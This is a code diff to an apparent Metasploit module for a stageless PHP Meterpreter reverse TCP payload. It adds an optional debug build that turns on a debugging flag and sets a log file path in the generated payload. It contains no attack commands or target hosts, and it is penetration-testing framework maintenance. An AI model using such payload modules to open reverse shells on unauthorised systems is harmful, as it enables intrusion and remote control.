@@ -7,7 +7,7 @@
 
 module MetasploitModule
 
-  CachedSize = 34282
+  CachedSize = 34792
 
   include Msf::Payload::Single
   include Msf::Payload::Php::ReverseTcp
@@ -38,6 +38,13 @@ module MetasploitModule
     # Stageless payloads need to have a blank session GUID
     session_guid = '\x00' * 16
     met = met.sub(%q|"SESSION_GUID", ""|, %Q|"SESSION_GUID", "#{session_guid}"|)
+
+    if datastore['MeterpreterDebugBuild']
+      met.sub!(%q|define("MY_DEBUGGING", false);|, %Q|define("MY_DEBUGGING", true);|)
+
+      logging_options = Msf::OptMeterpreterDebugLogging.parse_logging_options(datastore['MeterpreterDebugLogging'])
+      met.sub!(%q|define("MY_DEBUGGING_LOG_FILE_PATH", false);|, %Q|define("MY_DEBUGGING_LOG_FILE_PATH", "#{logging_options[:rpath]}");|) if logging_options[:rpath]
+    end
 
     met.gsub!(/#.*$/, '')
     met = Rex::Text.compress(met)
